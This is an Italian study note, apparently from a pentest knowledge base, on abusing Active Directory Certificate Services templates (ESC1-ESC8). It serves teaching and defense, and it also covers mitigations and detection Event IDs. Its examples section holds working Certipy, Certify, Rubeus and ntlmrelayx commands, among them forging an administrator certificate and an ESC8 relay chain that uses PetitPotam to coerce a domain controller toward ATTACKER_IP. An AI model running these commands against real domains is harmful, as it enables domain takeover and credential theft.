---
tipo: concetto
tag: [windows, active-directory]
fase: 3
fonti: 4
aggiornato: 2026-06-28
stato: maturo
aliases: ["ADCS e Template Vulnerabili (ESC1-ESC8)"]
---

# ADCS e Template Vulnerabili (ESC1-ESC8)

> **Nota etica**: tecniche da usare solo in lab autorizzati (TryHackMe, HTB, GOAD) o engagement con permesso scritto.

## In breve
**AD CS** (Active Directory Certificate Services) è la PKI integrata in [[Active Directory]]: emette certificati X.509 usati per autenticazione (smart card, PKINIT), firma e cifratura. Il problema è che **un certificato di autenticazione vale quanto una password**: con PKINIT un certificato valido permette di richiedere un **TGT** [[Kerberos]] per l'account indicato nel certificato. SpecterOps ha catalogato 8 misconfigurazioni di escalation (**ESC1-ESC8**) nel whitepaper *Certified Pre-Owned*. Molte sono **abusi di privilege escalation a Domain Admin** partendo da un utente di dominio qualunque, e — punto chiave — i certificati **sopravvivono al cambio password**, quindi diventano persistenza a lungo termine (ATT&CK **T1649**).

## Come funziona
Un **certificate template** è un oggetto in `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...`. I campi che contano per l'abuso:

- **EKU (Extended Key Usage / pKIExtendedKeyUsage)**: definisce a cosa serve il cert. Per autenticarsi servono OID come *Client Authentication* (`1.3.6.1.5.5.7.3.2`), *PKINIT Client Authentication* (`1.3.6.1.5.2.3.4`), *Smart Card Logon* (`1.3.6.1.4.1.311.20.2.2`), oppure **Any Purpose** o **nessun EKU (SubCA)**.
- **Enrollment Rights**: ACL (`msPKI-Certificate-Name-Flag`, security descriptor del template) che dicono **chi può richiedere** il certificato. Se include *Domain Users* / *Authenticated Users*, chiunque può enrollare.
- **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** (in `msPKI-Certificate-Name-Flag`): il **richiedente sceglie il Subject / SAN**. Questa è la falla di **ESC1**: se posso autenticarmi con un cert e posso indicare un **SAN arbitrario** (es. `administrator@dominio.local`), ottengo un certificato che mi autentica **come l'amministratore**.
- **Manager Approval** e **Authorized Signatures**: se assenti, l'emissione è automatica.

Una volta ottenuto il certificato (`.pfx`), lo si usa per **PKINIT**: si richiede un TGT come l'utente del SAN. Da lì si estrae l'NT hash (UnPAC-the-hash) o si fa [[Pass-the-Hash]] / [[DCSync]].

```
Utente normale --enroll--> Template ESC1 (SAN arbitrario) --> cert "admin"
        --PKINIT--> TGT come Administrator --> DCSync --> dominio
```

## Esempi
Enumerazione con **Certipy** (trova template vulnerabili e li classifica ESCx):
```bash
# Trova e marca le vulnerabilità (output testo + json)
certipy find -u user@dominio.local -p 'Password!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output filtrato già pronto
certipy find -u user@dominio.local -p 'Password!' -dc-ip 10.10.10.1 -enabled
```
**ESC1** — richiedo cert con SAN arbitrario, poi TGT + hash:
```bash
certipy req -u user@dominio.local -p 'Password!' -dc-ip 10.10.10.1 \
  -ca DOMINIO-CA -template VulnTemplate -upn administrator@dominio.local

# Uso il pfx per ottenere TGT e l'NT hash (UnPAC-the-hash)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
Da Windows con **Certify** + **Rubeus**:
```
Certify.exe find /vulnerable
Certify.exe request /ca:DC01\DOMINIO-CA /template:VulnTemplate /altname:administrator
# converti in pfx (openssl), poi:
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt
```
**ESC8** (NTLM relay verso l'endpoint web di enrollment, vedi [[NTLM Relay]] e [[PrinterBug e Coercizione]]):
```bash
# 1) relay verso /certsrv (HTTP enrollment) chiedendo un cert per il DC
certipy relay -target http://CA-HOST/certsrv/certfnsh.asp -template DomainController
# 2) coercizione: forzo il DC ad autenticarsi verso di noi (PetitPotam)
python3 PetitPotam.py -u user -p pass ATTACKER_IP DC_IP
# 3) col cert del DC: TGT del DC$ -> DCSync
certipy auth -pfx dc.pfx -dc-ip 10.10.10.1
```
Shadow/relay via **Impacket** (`ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs`) è l'alternativa classica.

## Mitigazione e difesa
- **Rimuovere `ENROLLEE_SUPPLIES_SUBJECT`** dai template che fanno autenticazione (chiude ESC1). Il SAN deve essere costruito dall'AD, non dal richiedente.
- **Restringere gli enrollment rights**: niente *Domain Users*/*Authenticated Users* su template di autenticazione; abilitare **Manager Approval**.
- **Rimuovere EKU pericolosi** (Any Purpose, SubCA, Smart Card Logon) dai template non necessari (mitiga ESC2/ESC3).
- **ESC8**: disabilitare l'**HTTP enrollment** o forzare **HTTPS + Extended Protection for Authentication (EPA)** e firma SMB/LDAP; bloccare la coercizione (patch PetitPotam, MS-EFSR).
- **ESC6**: applicare la patch CVE-2022-26923 / disabilitare `EDITF_ATTRIBUTESUBJECTALTNAME2` sulla CA.
- **ESC4**: audit delle ACL sugli oggetti template (write = riconfigurarli in ESC1).
- Eseguire **`certipy find -vulnerable`** o **PSPKIAudit** periodicamente; monitorare emissione certificati anomali.

## Lab
- [[TryHackMe]] — room *AD Certificate Templates*.
- [[HackTheBox]] — macchine **Certified** (ESC9/shadow cred) e **Escape** (ESC1); box **EscapeTwo**.
- **GOAD - Game of Active Directory**: include scenari ADCS ESC1/ESC8 pronti.

## Domande
1. **Perché un certificato è pericoloso quanto una password?** Perché con PKINIT autentica a Kerberos e produce un TGT; inoltre **non scade al cambio password**, quindi è persistenza.
2. **Qual è la falla precisa di ESC1?** Template di autenticazione che permette al richiedente di specificare un **SAN arbitrario** (`ENROLLEE_SUPPLIES_SUBJECT`) con enrollment aperto.
3. **Cos'è ESC8 e perché si combina con la coercizione?** È il relay NTLM verso l'endpoint web di enrollment: serve forzare il DC ad autenticarsi (PetitPotam/PrinterBug) per relayare il suo NTLM e ottenere un cert del DC$.
4. **Come estraggo l'NT hash da un certificato?** Con `certipy auth` / `Rubeus asktgt` ottengo il TGT e, via UnPAC-the-hash, l'NT hash dell'account.
5. **Quale Event ID indica l'emissione di un certificato?** **4886** (richiesta ricevuta) e **4887** (certificato emesso) sulla CA.

## Approfondimento livello esperto
**Catalogo ESC (SpecterOps):**
- **ESC1** — Template auth + `ENROLLEE_SUPPLIES_SUBJECT` + enroll aperto → SAN arbitrario → impersonazione.
- **ESC2** — Template con EKU **Any Purpose** o nessun EKU (di fatto SubCA): il cert vale per qualsiasi scopo, incluso auth.
- **ESC3** — Template **Enrollment Agent** (Certificate Request Agent EKU): si richiede un cert "on behalf of" un altro utente.
- **ESC4** — **ACL deboli sul template** (Write/FullControl): l'attaccante riscrive il template rendendolo ESC1.
- **ESC5** — ACL deboli su oggetti PKI nella **Configuration** (CA object, NTAuthCertificates, container) → compromissione PKI.
- **ESC6** — Flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** sulla CA: il SAN si può iniettare su qualunque template (CVE-2022-26923, "Certifried").
- **ESC7** — Diritti **ManageCA / ManageCertificates** sulla CA: si può approvare richieste, abilitare flag, o pubblicare template (escalation indiretta a ESC6).
- **ESC8** — **NTLM relay** verso l'HTTP enrollment endpoint (`/certsrv`): si combina con **PetitPotam/PrinterBug** per coercire il DC, relayare il suo NTLM e ottenere un cert per **DC$** → poi [[DCSync]].

**RBCD/relay chain con coercizione**: ESC8 è l'esempio canonico di catena *coercion → relay → certificate → TGT → DCSync*; vedi [[Delegation Kerberos (Unconstrained, Constrained, RBCD)]] per l'alternativa RBCD a partire dallo stesso relay.

**Persistenza basata su certificati**: un attaccante con accesso temporaneo enrolla un cert utente (validità anche anni) → mantiene autenticazione PKINIT anche dopo reset password (**T1649 — Steal or Forge Authentication Certificates**). Si rileva confrontando i cert emessi con l'attività dell'account.

**Detection (Event ID)**: sulla CA **4886** (richiesta) e **4887** (emesso) con SAN inatteso; sul DC **4768** (TGT request) con campo *Certificate Information* popolato = login PKINIT, **4769** (TGS) e **4624** anomali; correlare 4887 con 4768 per lo stesso SAN. Monitorare modifiche ai template (**5136** su oggetti pKICertificateTemplate).

## Collegamenti
- [[Active Directory]] · [[Kerberos]] — PKINIT produce il TGT abusato
- [[DCSync]] — passo finale dopo aver ottenuto il cert del DC$
- [[Pass-the-Hash]] — uso dell'NT hash estratto (UnPAC)
- [[NTLM Relay]] · [[PrinterBug e Coercizione]] — innesco di ESC8
- [[BloodHound]] — visualizza ACL e edge ADCS
- [[Impacket]] · [[bloodyAD]] · [[Mimikatz]]
- [[Delegation Kerberos (Unconstrained, Constrained, RBCD)]] · [[Shadow Credentials]] · [[Trust di Dominio e Foresta]]

## Fonti
- SpecterOps — *Certified Pre-Owned* (whitepaper PDF): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certipy (GitHub): https://github.com/ly4k/Certipy
- HackTricks — AD CS / Certificates: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates
- dirkjanm — *Relaying to AD Certificate Services* (ESC8): https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
